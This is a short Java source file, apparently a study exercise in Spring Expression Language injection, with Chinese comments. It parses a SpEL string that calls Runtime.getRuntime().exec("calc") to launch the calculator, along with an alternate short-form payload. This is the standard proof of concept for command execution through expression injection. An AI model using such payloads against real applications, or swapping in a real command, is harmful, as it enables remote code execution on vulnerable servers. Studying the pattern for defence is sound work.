package com.drunkbaby.expression;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class ExpressionCalc {// 字符串字面量

    public static void main(String[] args) {
        //String spel = "123"+"456";
        // 算数运算
        //String spel = "123+456";
        // 操作类弹计算器，当然java.lang包下的类是可以省略包名的
        String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
        // String spel = "T(Runtime).getRuntime().exec(\"calc\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
